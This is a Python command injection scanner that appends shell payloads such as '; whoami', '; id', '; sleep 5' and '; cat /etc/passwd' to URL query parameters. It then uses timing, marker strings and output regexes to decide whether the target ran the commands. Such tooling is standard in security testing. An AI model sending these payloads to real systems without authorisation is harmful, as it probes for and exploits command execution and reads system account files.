#!/usr/bin/env python3

import re
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional, Tuple, Callable, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from dataclasses import dataclass
import threading
import random
import string
import json


@dataclass
class CmdInjectionResult:
    """Data class for Command Injection scan results"""
    url: str
    is_vulnerable: bool
    vulnerability_type: str
    os_type: str  # 'linux', 'windows', 'unknown'
    payload: Optional[str]
    response_time: float
    error_message: Optional[str]
    risk_level: str
    timestamp: datetime
    additional_info: Dict[str, Any]


class CmdInjectionScanner:
    """
    Enhanced Command Injection Scanner (v2)
    
    Key Improvements:
    - Context-aware detection (distinguishes echo from execution)
    - Unique marker-based validation
    - Content-type aware analysis
    - Time-based detection with validation
    - Reduced false positives through evidence correlation
    """
    
    def __init__(self, max_threads: int = 10, timeout: int = 15, delay: float = 1.0):
        self.max_threads = max_threads
        self.timeout = timeout
        self.delay = delay
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Enhanced payload categories with unique markers
        self.payloads = {
            'basic_linux': [
                # Simple command injection without markers for basic detection
                '; whoami',
                '| whoami', 
                '&& whoami',
                '; id',
                '| id',
                '&& id',
                '; uname -a',
                '| uname -a',
                '; pwd',
                '| pwd',
                '; ls',
                '| ls',
                '; cat /etc/passwd',
                '| cat /etc/passwd'
            ],
            'basic_windows': [
                '; whoami',
                '| whoami',
                '&& whoami', 
                '; dir',
                '| dir',
                '&& dir',
                '; hostname',
                '| hostname'
            ],
            'time_based_simple': [
                '; sleep 5',
                '| sleep 5',
                '&& sleep 5',
                '; ping -c 5 127.0.0.1',
                '| ping -c 5 127.0.0.1'
            ],
            'linux_execution_test': [
                '; echo "CMDEXEC_UNIQUE_MARKER_START_{}"; uname -a; echo "CMDEXEC_UNIQUE_MARKER_END_{}"',
                '| echo "CMDEXEC_UNIQUE_MARKER_START_{}"; whoami; echo "CMDEXEC_UNIQUE_MARKER_END_{}"',
                '&& echo "CMDEXEC_UNIQUE_MARKER_START_{}"; id; echo "CMDEXEC_UNIQUE_MARKER_END_{}"',
                '; echo "CMDEXEC_UNIQUE_MARKER_START_{}"; pwd; echo "CMDEXEC_UNIQUE_MARKER_END_{}"'
            ],
            'windows_execution_test': [
                '; echo "CMDEXEC_UNIQUE_MARKER_START_{}"; dir; echo "CMDEXEC_UNIQUE_MARKER_END_{}"',
                '| echo "CMDEXEC_UNIQUE_MARKER_START_{}"; whoami; echo "CMDEXEC_UNIQUE_MARKER_END_{}"',
                '&& echo "CMDEXEC_UNIQUE_MARKER_START_{}"; hostname; echo "CMDEXEC_UNIQUE_MARKER_END_{}"'
            ],
            'time_based_linux': [
                # Time-based payloads with markers
                '; echo "CMDTIME_START_{}"; sleep 3; echo "CMDTIME_END_{}"',
                '| echo "CMDTIME_START_{}"; sleep 3; echo "CMDTIME_END_{}"'
            ],
            'time_based_windows': [
                '; echo "CMDTIME_START_{}"; ping -n 3 127.0.0.1; echo "CMDTIME_END_{}"',
                '| echo "CMDTIME_START_{}"; timeout /t 3; echo "CMDTIME_END_{}"'
            ],
            'error_based': [
                # Commands that produce distinctive error patterns
                '; nonexistentcommand12345',
                '| nonexistentcommand12345',
                '&& nonexistentcommand12345'
            ]
        }
        
        self.lock = threading.Lock()
        self.stop_scanning = False
        
        # Advanced detection patterns for confirmed execution
        self.execution_patterns = {
            'basic_linux': [
                # Simple command output patterns
                r'uid=\d+\(.*?\)\s+gid=\d+',  # id command output
                r'Linux.*\d+\.\d+\.\d+',  # uname output
                r'/.*?/',  # pwd output (path)
                r'root.*:.*:.*:',  # whoami in some contexts
                r'total \d+',  # ls output
                r'drwxr-xr-x',  # ls -l permissions
                r'root:x:\d+:\d+:',  # /etc/passwd content
            ],
            'basic_windows': [
                r'Directory of [A-Z]:\\',  # dir command
                r'Volume in drive [A-Z]',  # dir command
                r'.*\\.*Users\\.*',  # Windows path
                r'HOSTNAME-.*|[A-Z]+-[A-Z]+',  # hostname output
            ],
            'linux_confirmed': [
                r'CMDEXEC_UNIQUE_MARKER_START_\w+.*?Linux.*?CMDEXEC_UNIQUE_MARKER_END_\w+',
                r'CMDEXEC_UNIQUE_MARKER_START_\w+.*?uid=\d+.*?CMDEXEC_UNIQUE_MARKER_END_\w+',
                r'CMDEXEC_UNIQUE_MARKER_START_\w+.*?/.*?CMDEXEC_UNIQUE_MARKER_END_\w+',  # pwd output
                r'CMDTIME_START_\w+.*?CMDTIME_END_\w+',  # Time-based with markers
            ],
            'windows_confirmed': [
                r'CMDEXEC_UNIQUE_MARKER_START_\w+.*?Directory of.*?CMDEXEC_UNIQUE_MARKER_END_\w+',
                r'CMDEXEC_UNIQUE_MARKER_START_\w+.*?Volume in drive.*?CMDEXEC_UNIQUE_MARKER_END_\w+',
                r'CMDTIME_START_\w+.*?CMDTIME_END_\w+',
            ],
            'error_confirmed': [
                # Distinctive command execution errors (not just echoing)
                r'command not found.*nonexistentcommand12345',
                r'is not recognized.*nonexistentcommand12345',
                r'/bin/sh:.*nonexistentcommand12345.*not found',
                r'cmd:.*nonexistentcommand12345.*not recognized'
            ]
        }
    
    def generate_unique_marker(self) -> str:
        """Generate unique marker for payload testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    def is_json_response(self, response: requests.Response) -> bool:
        """Check if response is JSON format"""
        content_type = response.headers.get('content-type', '').lower()
        if 'application/json' in content_type:
            return True
        
        try:
            json.loads(response.text)
            return True
        except (json.JSONDecodeError, ValueError):
            return False
    
    def is_echo_only(self, payload: str, response: requests.Response) -> bool:
        """
        Determine if response is just echoing the payload without execution.
        This is the key to reducing false positives.
        """
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # If it's JSON and just contains the payload, it's likely echo
        if self.is_json_response(response):
            # Check if payload appears in a JSON value context
            try:
                json_data = json.loads(response.text)
                # Look for payload in JSON structure (common with httpbin.org/get)
                json_str = json.dumps(json_data).lower()
                if payload_lower in json_str:
                    return True
            except:
                pass
        
        # Special check for marker-based payloads in echo contexts
        if 'cmdexec_unique_marker' in payload_lower or 'cmdtime_start' in payload_lower:
            if payload_lower in response_text:
                echo_indicators = [
                    '"args":', '"param":', '"data":', '"form":',  # JSON structure
                    'param=', 'data=', 'q=', 'search=',  # URL-encoded
                    'you searched for:', 'input:', 'value:'  # Form echo patterns
                ]
                
                has_echo_structure = any(indicator in response_text for indicator in echo_indicators)
                if has_echo_structure:
                    return True  # This is structured echo, not execution
        
        # Check for other echo patterns
        # If payload appears but without execution evidence, it's echo
        if payload_lower in response_text:
            execution_indicators = [
                'command not found',
                'is not recognized',
                'uid=', 'gid=',  # id command output
                'directory of',  # dir command
                'volume in drive'  # Windows dir
            ]
            
            has_execution_evidence = any(indicator in response_text for indicator in execution_indicators)
            if not has_execution_evidence:
                return True  # Just echo, no execution
        
        return False
    
    def detect_command_execution(self, payload: str, response: requests.Response, 
                                response_time: float, marker: str) -> Tuple[bool, str, str]:
        """
        Enhanced detection that distinguishes between echo and actual execution
        """
        response_text = response.text
        
        # Handle basic payloads without markers
        if not ('CMDEXEC_UNIQUE_MARKER' in payload or 'CMDTIME_START' in payload):
            return self.detect_basic_command_execution(payload, response, response_time)
        
        # First, check if this is just an echo (most important for reducing false positives)
        if self.is_echo_only(payload, response):
            return False, "", "Payload echoed but no execution evidence found"
        
        if response_time > 2.5 and 'CMDTIME_START_' in payload:
            marker_pattern = f'CMDTIME_START_{marker}.*?CMDTIME_END_{marker}'
            if re.search(marker_pattern, response_text, re.DOTALL | re.IGNORECASE):
                if not self.is_json_response(response):
                    return True, "unknown", f"Time-based injection confirmed with markers (response time: {response_time:.2f}s)"
        
        # Check for confirmed execution patterns - but be more careful about context
        for os_type, patterns in self.execution_patterns.items():
            for pattern in patterns:
                test_pattern = pattern.replace('\\w+', marker)
                
                if re.search(test_pattern, response_text, re.DOTALL | re.IGNORECASE):
                    # Found pattern, but verify it's not in an echo context
                    # Check if the entire payload appears quoted or in JSON structure
                    if self.is_json_response(response):
                        continue
                    
                    quoted_payload = f'"{payload}"' in response_text or f"'{payload}'" in response_text
                    if quoted_payload:
                        continue  # Skip quoted payloads as they're likely echoed
                    
                    detected_os = os_type.split('_')[0]  # Extract 'linux' or 'windows'
                    evidence = f"Confirmed command execution with pattern: {pattern}"
                    return True, detected_os, evidence
        
        # Check for error-based injection
        if 'nonexistentcommand12345' in payload:
            for pattern in self.execution_patterns['error_confirmed']:
                if re.search(pattern, response_text, re.IGNORECASE):
                    # Make sure this isn't just echoing the error in JSON
                    if not self.is_json_response(response):
                        return True, "unknown", f"Command execution error confirmed: {pattern}"
        
        suspicious_indicators = 0
        
        if not self.is_json_response(response) and payload.lower() not in response_text.lower():
            if len(response_text) > 1000:  # Large response might contain command output
                suspicious_indicators += 1
            
            system_patterns = [
                r'total \d+',  # ls -l output
                r'drwxr-xr-x',  # file permissions
                r'\d+:\d+:\d+',  # timestamps
                r'[A-Z]:\\',  # Windows paths
                r'/bin/', r'/usr/', r'/etc/',  # Unix paths
            ]
            
            pattern_matches = 0
            for pattern in system_patterns:
                if re.search(pattern, response_text):
                    pattern_matches += 1
            
            if pattern_matches >= 2:  # Multiple system patterns suggest execution
                suspicious_indicators += 2
            
            if re.search(r'^\w+:\s*.*$', response_text, re.MULTILINE):  # Key:value pairs
                suspicious_indicators += 1
        
        if suspicious_indicators >= 3:
            return True, "unknown", f"Multiple execution indicators found (confidence: {suspicious_indicators}/5)"
        
        return False, "", "No confirmed execution evidence found"
    
    def detect_basic_command_execution(self, payload: str, response: requests.Response, 
                                     response_time: float) -> Tuple[bool, str, str]:
        """
        Detection for basic payloads without markers
        """
        response_text = response.text.lower()
        
        # Time-based detection for simple payloads
        if response_time > 3.0 and ('sleep' in payload or 'ping' in payload):
            return True, "linux" if 'sleep' in payload else "unknown", f"Time-based injection detected (response time: {response_time:.2f}s)"
        
        # Check for basic command output patterns
        for os_type, patterns in self.execution_patterns.items():
            if os_type.startswith('basic_'):
                for pattern in patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        # Additional check: ensure it's not just echoed
                        if not self.is_simple_echo(payload, response_text):
                            return True, os_type.replace('basic_', ''), f"Command execution detected: {pattern}"
        
        return False, "", "No basic command execution detected"
    
    def is_simple_echo(self, payload: str, response_text: str) -> bool:
        """
        Simple echo detection for basic payloads
        """
        payload_lower = payload.lower()
        
        # If the exact payload appears in the response, it might be echo
        if payload_lower in response_text:
            # Check for echo indicators
            echo_context_patterns = [
                f'param.*{re.escape(payload_lower)}',
                f'input.*{re.escape(payload_lower)}',
                f'value.*{re.escape(payload_lower)}',
                f'args.*{re.escape(payload_lower)}'
            ]
            
            for pattern in echo_context_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
        
        return False
    
    def test_payload(self, url: str, payload_template: str) -> CmdInjectionResult:
        """Test a single command injection payload against a URL"""
        start_time = time.time()
        
        parsed_url = urlparse(url)
        
        if not parsed_url.query:
            return CmdInjectionResult(
                url=url,
                is_vulnerable=False,
                vulnerability_type="Command Injection",
                os_type="",
                payload=payload_template,
                response_time=0.0,
                error_message="No query parameters found",
                risk_level="Info",
                timestamp=datetime.now(),
                additional_info={}
            )
        
        try:
            marker = self.generate_unique_marker()
            
            # Create payload with unique marker
            if '{}' in payload_template:
                payload = payload_template.format(marker, marker)
            else:
                payload = payload_template
            
            query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            
            # Test payload in each parameter
            for param_name in query_params:
                baseline_start = time.time()
                baseline_response = self.session.get(url, timeout=self.timeout)
                baseline_time = time.time() - baseline_start
                
                # Create test URL with payload
                test_params = query_params.copy()
                original_value = query_params[param_name][0] if query_params[param_name] else ""
                test_params[param_name] = [original_value + payload]
                
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    test_query,
                    parsed_url.fragment
                ))
                
                request_start = time.time()
                response = self.session.get(test_url, timeout=self.timeout)
                response_time = time.time() - request_start
                
                adjusted_time = response_time - baseline_time
                
                is_vulnerable, os_type, evidence = self.detect_command_execution(
                    payload, response, adjusted_time, marker
                )
                
                if is_vulnerable:
                    risk_level = self._determine_risk_level(os_type, payload, evidence)
                    
                    return CmdInjectionResult(
                        url=url,
                        is_vulnerable=True,
                        vulnerability_type="Command Injection",
                        os_type=os_type,
                        payload=payload,
                        response_time=response_time,
                        error_message=None,
                        risk_level=risk_level,
                        timestamp=datetime.now(),
                        additional_info={
                            'tested_parameter': param_name,
                            'test_url': test_url,
                            'response_code': response.status_code,
                            'evidence': evidence,
                            'payload_category': self._get_payload_category(payload_template),
                            'content_type': response.headers.get('content-type', ''),
                            'response_length': len(response.text),
                            'marker_used': marker,
                            'baseline_time': baseline_time,
                            'adjusted_time': adjusted_time
                        }
                    )
                
                time.sleep(self.delay)
            
            total_time = time.time() - start_time
            return CmdInjectionResult(
                url=url,
                is_vulnerable=False,
                vulnerability_type="Command Injection",
                os_type="",
                payload=payload,
                response_time=total_time,
                error_message=None,
                risk_level="Safe",
                timestamp=datetime.now(),
                additional_info={'marker_used': marker}
            )
            
        except requests.exceptions.RequestException as e:
            total_time = time.time() - start_time
            return CmdInjectionResult(
                url=url,
                is_vulnerable=False,
                vulnerability_type="Command Injection",
                os_type="",
                payload=payload_template,
                response_time=total_time,
                error_message=str(e),
                risk_level="Error",
                timestamp=datetime.now(),
                additional_info={}
            )
    
    def _determine_risk_level(self, os_type: str, payload: str, evidence: str) -> str:
        """Determine risk level based on detected vulnerability"""
        if "confirmed" in evidence.lower():
            return "Critical"
        elif "time-based" in evidence.lower():
            return "High"
        elif "error" in evidence.lower():
            return "Medium"
        elif "indicators" in evidence.lower():
            return "Medium"
        else:
            return "Low"
    
    def _get_payload_category(self, payload: str) -> str:
        """Get payload category for reporting"""
        if "CMDEXEC_UNIQUE_MARKER" in payload:
            return "Execution Test"
        elif "CMDTIME_START" in payload:
            return "Time-based"
        elif "nonexistentcommand" in payload:
            return "Error-based"
        else:
            return "Basic"
    
    def scan_url(self, url: str, progress_callback: Optional[Callable] = None) -> List[CmdInjectionResult]:
        """
        Scan a single URL for command injection vulnerabilities
        """
        results = []
        
        # Get all payloads
        all_payloads = []
        for category, payload_list in self.payloads.items():
            all_payloads.extend(payload_list)
        
        total_payloads = len(all_payloads)
        
        for i, payload in enumerate(all_payloads):
            if self.stop_scanning:
                break
                
            result = self.test_payload(url, payload)
            results.append(result)
            
            if progress_callback:
                progress = ((i + 1) / total_payloads) * 100
                progress_callback(progress, f"Testing payload {i+1}/{total_payloads}")
        
        return results
    
    def scan_urls(self, urls: List[str], progress_callback: Optional[Callable] = None,
                  status_callback: Optional[Callable] = None) -> List[CmdInjectionResult]:
        """
        Scan multiple URLs for command injection vulnerabilities
        """
        all_results = []
        
        if status_callback:
            status_callback(f"Starting command injection scan of {len(urls)} URLs")
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_url = {}
            
            for url in urls:
                if self.stop_scanning:
                    break
                future = executor.submit(self.scan_url, url)
                future_to_url[future] = url
            
            completed = 0
            total_urls = len(urls)
            
            for future in as_completed(future_to_url):
                if self.stop_scanning:
                    break
                    
                url = future_to_url[future]
                try:
                    results = future.result()
                    all_results.extend(results)
                    
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total_urls)
                    
                    # Check for vulnerabilities and report status
                    vulnerable_results = [r for r in results if r.is_vulnerable]
                    if vulnerable_results and status_callback:
                        status_callback(f"Found command injection vulnerability in {url}")
                    elif status_callback:
                        status_callback(f"✅ Completed {url} - no command injection vulnerabilities")
                        
                except Exception as e:
                    print(f"Error scanning {url}: {e}")
                    if status_callback:
                        status_callback(f"❌ Error scanning {url}: {str(e)}")
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total_urls)
        
        return all_results
    
    def stop_scan(self):
        """Stop ongoing scan"""
        self.stop_scanning = True
    
    def get_vulnerable_results(self, results: List[CmdInjectionResult]) -> List[CmdInjectionResult]:
        """Filter results to only vulnerable findings"""
        return [result for result in results if result.is_vulnerable]
    
    def get_stats(self, results: List[CmdInjectionResult]) -> Dict[str, Any]:
        """Get scan statistics"""
        total = len(results)
        vulnerable = len(self.get_vulnerable_results(results))
        
        stats = {
            'total_tests': total,
            'vulnerable_findings': vulnerable,
            'clean_results': total - vulnerable,
            'success_rate': (total - len([r for r in results if r.error_message])) / total * 100 if total > 0 else 0,
            'vulnerability_rate': vulnerable / total * 100 if total > 0 else 0
        }
        
        os_types = {}
        for result in self.get_vulnerable_results(results):
            os_type = result.os_type or 'unknown'
            os_types[os_type] = os_types.get(os_type, 0) + 1
        stats['os_distribution'] = os_types
        
        risk_levels = {}
        for result in self.get_vulnerable_results(results):
            risk_level = result.risk_level
            risk_levels[risk_level] = risk_levels.get(risk_level, 0) + 1
        stats['risk_distribution'] = risk_levels
        
        return stats
